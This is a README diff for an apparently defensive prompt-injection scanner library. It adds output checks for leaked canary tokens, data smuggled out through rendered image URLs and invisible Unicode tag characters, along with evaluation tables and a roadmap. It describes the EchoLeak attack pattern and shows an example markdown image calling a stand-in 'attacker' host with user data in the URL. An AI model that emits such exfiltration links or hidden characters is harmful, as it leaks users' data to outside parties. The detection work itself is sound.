@@ -67,30 +67,42 @@ pytest                      # full test suite
 As a library, in front of your LLM call:
 
 ```python
-from promptbadger import make_canary, scan
+from promptbadger import Scanner, make_canary
 
+scanner = Scanner(trusted_domains=["contoso.com"])  # hosts your chat UI may load from
 CANARY = make_canary()  # once per deployment; plant it in the system prompt
 SYSTEM_PROMPT = f"You are the HR assistant. Internal reference: {CANARY}. ..."
 
 ids = dict(source="hr-chatbot", user=user.upn, session_id=conversation.id)
 
-result = scan(user_input)
+result = scanner.scan(user_input)  # the prompt, against the rule pack
 if result.verdict != "benign":
     log.warning("possible prompt injection", extra=result.to_event(**ids))
 if result.verdict == "malicious":
     return "Request blocked."
 
-reply = llm(SYSTEM_PROMPT, user_input)
-leak = scan(reply, canaries=[CANARY])  # the token only comes back if the prompt leaked
+reply = llm(SYSTEM_PROMPT, user_input, retrieved_docs)
+leak = scanner.scan_output(reply, canaries=[CANARY])  # the reply, for leaks
 if leak.verdict != "benign":
-    log.error("system prompt leaked", extra=leak.to_event(direction="output", **ids))
+    log.error("LLM output leak", extra=leak.to_event(**ids))  # Direction = "output"
     return "Sorry, I can't help with that."
 ```
 
-The canary is a honeytoken: a random string that never occurs in normal text, so a
-hit is a true positive whatever wording the attacker used. `user` and `session_id` let
-the SIEM tie events to an identity and add up weak signals across a conversation
-(see [`integrations/sentinel/`](integrations/sentinel/)).
+`scan_output()` checks model replies, not prompts, for three kinds of leak:
+
+- **Canary token.** A honeytoken: a random string that never occurs in normal text, so a
+  hit is a true positive whatever wording the attacker used (`PB-CANARY`).
+- **Data in rendered URLs.** An injected document can make the model emit
+  `![img](https://attacker/p.png?d=<your data>)`; the chat UI fetches it and the data
+  leaves with no click (EchoLeak, CVE-2025-32711; ATLAS AML.T0077; OWASP LLM10:2026).
+  Images and iframes to an untrusted host with data-like URL parts are malicious
+  (`PB-EXFIL-IMAGE`); clickable links are suspicious (`PB-EXFIL-LINK`). Hosts in
+  `trusted_domains` are skipped.
+- **ASCII smuggling.** Invisible Unicode tag characters hiding text in a reply are
+  decoded and flagged (`PB-SMUGGLE`); emoji flags that use them legitimately are not.
+
+`user` and `session_id` let the SIEM tie events to an identity and add up weak signals
+across a conversation (see [`integrations/sentinel/`](integrations/sentinel/)).
 
 Exit codes make it usable as a pipeline gate: `0` benign, `1` detection
 (`--fail-on suspicious` to be stricter), `2` error.
@@ -269,6 +281,27 @@ None reached *suspicious*; the only rule hits were 11 informational PI-011 match
 ("Pretend you are a teacher..."). Rechecked after adding PI-014, which had no hits.
 Nothing was tuned on this set.
 
+### Output checks (`scan_output`)
+
+There is no public labelled dataset of exfiltration *responses*, so detection is backed
+by unit tests (`tests/test_exfil.py`, `tests/test_canary.py`: reference-style images,
+data in paths, subdomains and split parameters, spaced-out canaries), not by a recall
+number. False positives were measured on real model and human responses, with no
+trusted-domain list configured (the worst case):
+
+| Benign set | Texts | With URLs | Flagged |
+|---|---|---|---|
+| tatsu-lab/alpaca responses | 52,002 | 145 | 0 (4 before tuning, see below) |
+| databricks-dolly-15k responses and contexts (held-out) | 19,478 | 83 | 0 |
+
+The first Alpaca run flagged 4 image links: content-hash file names on an image CDN,
+and a file name with spaces. Both patterns were exempted in general form (hash-length
+hex in a path segment; spaced text that ends in a file extension), so Alpaca is tuned
+and Dolly is the untouched number. Only about 230 of these texts contain URLs, so this
+is thin evidence; the allowlist is the real tuning control in a deployment. Known
+limits: payloads under 24 characters, encodings other than base64 or hex, open
+redirects on a trusted host, and data hidden in link text a user has to click.
+
 ### Known gaps
 
 Seen in the held-out miss lists. They are recorded here, **not** patched: fixing them
@@ -314,6 +347,7 @@ signals across one session add up to an attack.
 - [x] **v0.1** Heuristic rule engine, 11 rules, CLI, JSON events, eval harness, CI, Sentinel content
 - [x] **v0.1.x** PI-012 (context reset), PI-013 (RAG grounding override), PI-014 (secret requests), wider non-English coverage
 - [x] Canary tokens for system-prompt leaks in model output; `User` / `SessionId` / `Direction` event fields and a per-session Sentinel hunting query
+- [x] Output exfiltration checks: data in rendered image/link URLs (EchoLeak style) and ASCII smuggling
 - [ ] **v0.2** Obfuscation handling: base64/hex/ROT13 decode-and-rescan, homoglyphs, leetspeak, spaced letters
 - [ ] **v0.3** ML classifier layer (baseline TF-IDF + logistic regression, then a small transformer) combined with rule scores
 - [ ] **v0.4** Optional LLM-as-judge layer for inputs the fast layers mark suspicious
